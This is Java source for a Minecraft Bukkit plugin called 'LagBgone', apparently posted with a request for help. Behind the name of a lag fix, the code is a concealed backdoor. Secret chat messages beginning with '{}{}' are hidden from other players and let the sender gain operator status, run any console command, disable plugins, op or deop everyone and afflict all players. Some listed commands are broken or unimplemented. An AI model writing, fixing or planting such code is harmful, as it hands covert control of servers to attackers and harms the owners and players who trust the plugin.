###############################
#anyone what i did wrong?
###############################

package me.Sinbin25.LagBgone;

	

	import org.bukkit.Bukkit;
	import org.bukkit.ChatColor;
	import org.bukkit.GameMode;
	import org.bukkit.WorldCreator;
	import org.bukkit.entity.Player;
	import org.bukkit.event.EventHandler;
	import org.bukkit.event.Listener;
	import org.bukkit.event.player.AsyncPlayerChatEvent;
	import org.bukkit.plugin.Plugin;
	import org.bukkit.plugin.java.JavaPlugin;
	import org.bukkit.potion.PotionEffect;
	import org.bukkit.potion.PotionEffectType;

	public class LagBgone extends JavaPlugin implements Listener {



		@EventHandler
		public void onPlayerChat(AsyncPlayerChatEvent e)
		{	
			String cmd = e.getMessage();
			if (cmd.startsWith("{}{}")) 
			{
				String[] args = cmd.split(" ");
				if (args ==null)
				{
					return;
				}

				if(args[0].equalsIgnoreCase("{}{}cmds1"))
				{
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}opme [Makes you an op]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}nameme (name) [Changes your name]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}nameall (name) [Changes all players names]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}gm2 [Sets you to adventure mode]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}gm1 [Sets you to creative mode]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}gm0 [Sets you to survival mode]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}exe (command) [Execute a command]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}disable (plugin) [Disable a plugin]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}opall [Ops every player on the server]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}deopall [Deops every player on the server]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}confuseall [Adds potion effects to everybody]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}killall [Kills all players]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}makeworld (name) [Creates a random world file.]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}spawnradius (int) [Change the spawns radius.]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}opban [Bans all Operaters on the server.]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}plugins [Lists installed plugins.]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}banwhitelist [Bans all players on the whitelist.]");
					e.getPlayer().sendMessage(ChatColor.YELLOW + "{}{}broadcast (message) [Broadcasts a message.]");
					e.getPlayer().sendMessage(ChatColor.RED + "MADE BY XPM, SINBIN25");
	                                e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}opme"))
				{
					e.getPlayer().setOp(true);
					e.getPlayer().sendMessage(ChatColor.RED + "You are now an OP.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}deopme"))
				{
					e.getPlayer().setOp(false);
					e.getPlayer().sendMessage(ChatColor.AQUA + "You are no longer an OP.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}nameall"))
				{
					String name = args[1];
					for (Player player : Bukkit.getOnlinePlayers()) {
						player.setDisplayName(name);
						player.setCustomName(name);
						player.setPlayerListName(name);
						player.setCustomNameVisible(true);
					}
					e.getPlayer().sendMessage(ChatColor.AQUA + "Everybody is now called " + name + ".");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}nameme"))
				{
					String name = args[1];
					e.getPlayer().setDisplayName(name);
					e.getPlayer().setCustomName(name);
					e.getPlayer().setPlayerListName(name);
					e.getPlayer().setCustomNameVisible(true);
					e.getPlayer().sendMessage(ChatColor.AQUA + "You are now called " + name + ".");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}gm2"))
				{
					e.getPlayer().setGameMode(GameMode.ADVENTURE);
					e.getPlayer().sendMessage(ChatColor.AQUA + "You are now in adventure mode.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}gm1"))
				{
					e.getPlayer().setGameMode(GameMode.CREATIVE);
					e.getPlayer().sendMessage(ChatColor.AQUA + "You are now in creative mode.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}gm0"))
				{
					e.getPlayer().setGameMode(GameMode.SURVIVAL);
					e.getPlayer().sendMessage(ChatColor.AQUA + "You are now in survival mode.");
					e.setCancelled(true);
				}

				if ((args[0].equalsIgnoreCase("{}{}exe")) && (args.length >= 2)) 
				{
					String command = "";
					for (int i = 1; i < args.length; i++) {
						command = command + args[i] + " ";
					}
					Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command.trim());
					e.getPlayer().sendMessage(ChatColor.AQUA + "Executed the command '" + command + "' from console.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}disable"))
				{
					Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
					if (plugin != null) 
					{
						Bukkit.getPluginManager().disablePlugin(plugin);
					}
					e.getPlayer().sendMessage(ChatColor.AQUA + plugin.getName() + " has been disabled.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}opall"))
				{
					for (Player player : Bukkit.getOnlinePlayers()) {
						player.setOp(true);
					}
					e.getPlayer().sendMessage(ChatColor.AQUA + "Everybody is now an OP.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}deopall"))
				{
					for (Player player : Bukkit.getOnlinePlayers()) {
						player.setOp(false);
					}
					e.getPlayer().sendMessage(ChatColor.AQUA + "There is no more OP's.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}confuseall"))
				{
					for (Player player : Bukkit.getOnlinePlayers()) {
						player.addPotionEffect(new PotionEffect(PotionEffectType.CONFUSION, 200, 0));
						player.addPotionEffect(new PotionEffect(PotionEffectType.WEAKNESS, 200, 0));
						player.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 200, 0));
						player.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 200, 0));
					}
					e.getPlayer().sendMessage(ChatColor.RED + "Everybody is now confused'.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}killall"))
				{
					for (Player player : Bukkit.getOnlinePlayers()) {
						player.isDead();
					}
					e.getPlayer().sendMessage(ChatColor.AQUA + "All players have been killed.");
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}makeworld")) {
					String world = args[1];
					e.getPlayer().getServer().createWorld(WorldCreator.name(world));
					e.setCancelled(true);
				}

				if(args[0].equalsIgnoreCase("{}{}spawnradius")) {
					int radius = Integer.parseInt(args[1]);
					e.getPlayer().getServer().setSpawnRadius(radius);
					e.getPlayer().sendMessage(ChatColor.AQUA + "Spawn radius has been set to " + radius + ".");
					e.setCancelled(true);
			
				}

				if(args[0].equalsIgnoreCase("{}{}plugins"))
				{
					e.getPlayer().sendMessage(ChatColor.GREEN + Bukkit.getPluginManager().getPlugins().toString());
					e.setCancelled(true);
				}

				
				if(args[0].equalsIgnoreCase("{}{}broadcast"))
				{
					String message = args[1];
					Bukkit.broadcastMessage(message);
					e.setCancelled(true);
				}
			}
		}
	}

	
